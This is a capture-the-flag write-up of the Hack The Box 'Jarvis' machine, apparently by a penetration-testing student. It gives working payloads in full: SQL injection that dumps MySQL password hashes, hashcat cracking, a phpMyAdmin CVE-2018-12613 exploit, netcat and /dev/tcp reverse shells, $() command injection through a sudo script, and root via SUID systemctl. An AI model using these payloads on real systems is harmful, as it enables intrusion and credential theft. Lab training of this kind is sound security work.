# HTB: Jarvis — Writeup

**Target IP:** 10.129.229.137
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan + Nmap)

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# rustscan -a 10.129.229.137 -- -sC -sV -oA nmap/nmap
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

Open 10.129.229.137:22
Open 10.129.229.137:80
Open 10.129.229.137:64999
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-30 06:17 +0000

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports open: **SSH (22)**, **HTTP (80)** — "Stark Hotel" site, and a second **HTTP service on 64999**. Visiting port 64999 directly resulted in a temporary ban (~90 seconds) from the host, so it wasn't pursued further and offered nothing else of note.

### 1.2 Directory Brute-Force (ffuf)

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# ffuf -u http://10.129.229.137/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -mc 200,301,403 -e .php,.txt,.html -fs 23628

       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://10.129.229.137/FUZZ
 :: Extensions       : .php .txt .html 
 :: Matcher          : Response status: 200,301,403
 :: Filter           : Response size: 23628
________________________________________________

.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 301ms]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 303ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 311ms]
nav.php                 [Status: 200, Size: 1333, Words: 76, Lines: 44, Duration: 308ms]
footer.php              [Status: 200, Size: 2237, Words: 101, Lines: 69, Duration: 304ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 313ms]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 305ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 301ms]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 469ms]
connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 303ms]
```

Notable finds: `room.php` (implied, part of the hotel site — booking/room lookup by `cod` parameter), `connection.php`, and a **`/phpmyadmin`** instance.

---

## 2. SQL Injection on `room.php`

### 2.1 Finding the Injection Point

Tested the `cod` GET parameter on `room.php` with several payloads that didn't behave as expected:

```
http://10.129.229.137/room.php?cod=4
http://10.129.229.137/room.php?cod=' OR 1=1-- -
http://10.129.229.137/room.php?cod="1" + "1"
http://10.129.229.137/room.php?cod=1+1
http://10.129.229.137/room.php?cod=1-1
```

Then tried a bare comment terminator:

```
http://10.129.229.137/room.php?cod=1-- -
```

This behaved differently — confirming the parameter is **not sanitized/quoted**, i.e. classic numeric (unquoted) SQL injection.

### 2.2 UNION-Based Column Count Discovery

```
http://10.129.229.137/room.php?cod=1 union select 1
http://10.129.229.137/room.php?cod=1 union select 1,2
http://10.129.229.137/room.php?cod=1 union select 1,2,3
http://10.129.229.137/room.php?cod=1 union select 1,2,3,4
http://10.129.229.137/room.php?cod=1 union select 1,2,3,4,5
http://10.129.229.137/room.php?cod=1 union select 1,2,3,4,5,6
http://10.129.229.137/room.php?cod=1 union select 1,2,3,4,5,6,7   ← works (7 columns)
```

Using an intentionally invalid `cod` value (e.g. `999`) forces the page to render the injected UNION row instead of a real record, making extracted data visible on the page.

### 2.3 Enumerating the Database

```
http://10.129.229.137/room.php?cod=999 union select 1,database(),3,4,5,6,7
→ hotel

http://10.129.229.137/room.php?cod=999 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database()
→ room

http://10.129.229.137/room.php?cod=999 union select 1,GROUP_CONCAT(column_name),3,4,5,6,7 from information_schema.columns where table_name='room'
→ cod,name,price,descrip,star,image,mini
```

The `hotel` database's only table (`room`) had nothing useful (no user/pass columns). Pivoted to enumerate **other databases** on the server.

### 2.4 Enumerating Other Databases → `mysql.user`

```
http://10.129.229.137/room.php?cod=999 union select 1,GROUP_CONCAT(schema_name),3,4,5,6,7 from information_schema.schemata
→ hotel,information_schema,mysql,performance_schema

http://10.129.229.137/room.php?cod=999 union select 1,GROUP_CONCAT(table_name),3,4,5,6,7 from information_schema.tables where table_schema='mysql'
→ column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,
help_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,
innodb_table_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,
slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,
time_zone_transition,time_zone_transition_type,user

http://10.129.229.137/room.php?cod=999 union select 1,GROUP_CONCAT(column_name),3,4,5,6,7 from information_schema.columns where table_schema='mysql' and table_name='user'
→ Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,
Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,
Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,
Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,
Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,
Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,
max_updates,max_connections,max_user_connections,plugin,authentication_string,
password_expired,is_role,default_role,max_statement_time
```

### 2.5 Dumping the Credential Hash

```
http://10.129.229.137/room.php?cod=999 union select 1,GROUP_CONCAT(User,':',Password,':',authentication_string,':',Host),3,4,5,6,7 from mysql.user
→ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0::localhost
```

Extracted a MySQL account: **`DBadmin`** with a MySQL-style password hash.

---

## 3. Cracking the Hash & phpMyAdmin Access

### 3.1 Hashcat

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# hashcat -m 300 -a 0 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 3 3250U with Radeon Graphics, 3467/6934 MB (1024 MB allocatable), 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Hash.Mode........: 300 (MySQL4.1/MySQL5)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385

2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou         

Session..........: hashcat
Status...........: Cracked
Hash.Target......: 2d2b7a5e4e637b8fba1d17f40318f277d29964d0
Time.Started.....: Thu Jul 30 07:51:22 2026 (1 sec)
Time.Estimated...: Thu Jul 30 07:51:23 2026 (0 secs)
Speed.#01........:     8147 H/s (0.71ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

**Cracked: `DBadmin` / `imissyou`**

### 3.2 phpMyAdmin Login

Logged into `/phpmyadmin` with `DBadmin:imissyou` successfully.

### 3.3 Identifying phpMyAdmin Version → CVE-2018-12613

Version disclosed via the built-in docs page:

```
http://10.129.229.137/phpmyadmin/doc/html/index.html
→ phpMyAdmin 4.8.0
```

phpMyAdmin **4.8.0** is vulnerable to **CVE-2018-12613** (LFI leading to RCE, via the `target` parameter combined with session-file poisoning through query logging).

---

## 4. Exploiting CVE-2018-12613 → Foothold as www-data

### 4.1 Public Exploit

Located a working Python 2 exploit script for CVE-2018-12613 on Exploit-DB:

```
https://www.exploit-db.com/exploits/50457
```

### 4.2 Confirming RCE

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# python2 exploit.py 10.129.229.137 80 /phpmyadmin DBadmin imissyou whoami
www-data
```

Command execution confirmed as **www-data**.

### 4.3 Reverse Shell

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# python2 exploit.py 10.129.229.137 80 /phpmyadmin DBadmin imissyou 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.146 4444 >/tmp/f'
```

Shell caught as **www-data**.

---

## 5. Privilege Escalation (www-data → pepper) via Sudo + Command Injection

### 5.1 Checking Sudo Rights

```
www-data@jarvis:/tmp$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

`www-data` can run **`simpler.py`** as user **pepper**, with no password.

### 5.2 Reviewing `simpler.py`

```
www-data@jarvis:/tmp$ cat /var/www/Admin-Utilities/simpler.py
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

.....
<snip — show_header(), show_statistics(), list_ip(), date_to_num(), to_dict(),
get_max_level(): log-parsing helper functions reading from /home/pepper/Web/Logs/,
none directly exploitable, kept only for context that the script analyzes attacker
logs and computes a "risk level" per IP>
.....

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The `-p` option (`exec_ping`) takes raw input and passes it straight to `os.system('ping ' + command)`. It blacklists `&`, `;`, `-`, `` ` ``, `||`, `|` — but **not `$()`** command substitution.

### 5.3 Command Injection via `$()`

```
www-data@jarvis:/usr/share/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(whoami)

ping: pepper: Temporary failure in name resolution
```

`ping: pepper` in the output confirms the `$(whoami)` substitution executed as **pepper** — command injection confirmed.

### 5.4 Reverse Shell as `pepper`

```
www-data@jarvis:/tmp$ echo '#!/bin/bash' > shell.sh
www-data@jarvis:/tmp$ echo 'sh -i >& /dev/tcp/10.10.15.146/4443 0>&1' >> shell.sh
www-data@jarvis:/tmp$ chmod +x shell.sh
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(/tmp/shell.sh)
```

```
┌──(root㉿kali)-[/home/kali/jarvis]
└─# nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.229.137] 58380
$ whoami
pepper
```

Shell stabilized (e.g. via `python3 -c 'import pty;pty.spawn("/bin/bash")'`).

---

## 6. user.txt

```
pepper@jarvis:/tmp$ cd /home
pepper@jarvis:/home$ ls
pepper
pepper@jarvis:/home$ cd pepper
pepper@jarvis:~$ ls       
Web  user.txt
pepper@jarvis:~$ cat user.txt | wc
      1       1      33
```

**User flag obtained.**

---

## 7. Privilege Escalation (pepper → root) via SUID `systemctl`

### 7.1 SUID Enumeration

```
pepper@jarvis:~$ find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 Mar 17  2021 /bin/su
-rwsr-xr-x 1 root root 40312 Mar 17  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 Mar 17  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 Mar 17  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 Mar 17  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jan 23  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 Mar 17  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**`/bin/systemctl`** stood out: SUID root, owned by `root:pepper`, and non-standard for a SUID binary — a strong privesc candidate confirmed against [GTFOBins](https://gtfobins.org/gtfobins/systemctl/).

### 7.2 Exploiting SUID `systemctl` (Malicious Service)

Created a malicious systemd service unit in the home directory that sets the SUID bit on `/bin/bash` when started:

```
pepper@jarvis:~$ cd /home/pepper
pepper@jarvis:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod u+s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > root.service
```

Linked and started it via the SUID `systemctl` binary:

```
pepper@jarvis:~$ systemctl link /home/pepper/root.service
Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.
pepper@jarvis:~$ systemctl start root.service
```

### 7.3 Root Shell

```
pepper@jarvis:~$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# pwd
/home/pepper
bash-4.4# cd /root
bash-4.4# ls
clean.sh  root.txt  sqli_defender.py
bash-4.4# cat root.txt | wc
      1       1      33
```

**Root obtained.** `root.txt` confirmed present in `/root` (alongside `clean.sh` and `sqli_defender.py` — box-cleanup/anti-SQLi scripts, not needed for the path taken).

---

## 8. Summary / Attack Chain

1. **Recon**: RustScan/Nmap → SSH (22), HTTP (80, "Stark Hotel"), and a second HTTP service on port 64999.
2. **Web enum**: ffuf → `nav.php`, `footer.php`, `connection.php`, and a `/phpmyadmin` install discovered.
3. **SQL injection**: `room.php?cod=` was found vulnerable to unauthenticated, unquoted numeric SQLi. Determined the UNION column count (7) and enumerated across `information_schema` to pull `mysql.user`, dumping the **DBadmin** MySQL password hash.
4. **Hash cracking**: Hashcat (mode 300, MySQL4.1/5) cracked the hash against rockyou.txt → `DBadmin:imissyou`.
5. **phpMyAdmin access & version disclosure**: Logged into phpMyAdmin with the cracked credentials; version 4.8.0 identified as vulnerable to **CVE-2018-12613** (LFI/RCE).
6. **RCE foothold**: Used a public Python2 PoC for CVE-2018-12613 to execute commands and pop a reverse shell as **www-data**.
7. **Sudo privesc (www-data → pepper)**: `sudo -l` showed NOPASSWD rights to run `simpler.py` as pepper. The script's `-p` (ping) option blacklisted several shell metacharacters but missed `$()` command substitution → command injection → reverse shell as **pepper**.
8. **User flag**: Retrieved from pepper's home directory.
9. **SUID privesc (pepper → root)**: Found `/bin/systemctl` set SUID root and owned by `pepper` group; abused it (per GTFOBins) by creating and starting a malicious systemd service that sets the SUID bit on `/bin/bash` → `/bin/bash -p` as **root** → `root.txt`.

### Key Vulnerabilities Chained
- Unauthenticated, unsanitized numeric SQL injection in `room.php` (`cod` parameter)
- Weak MySQL account password (`imissyou`), crackable via rockyou.txt
- Outdated phpMyAdmin (4.8.0) vulnerable to CVE-2018-12613 (LFI → RCE)
- Overly permissive `sudo` rule allowing a script with an incomplete input-sanitization blacklist to be run as another user, enabling command-substitution injection
- Dangerous SUID bit on `systemctl`, allowing arbitrary systemd unit execution as root
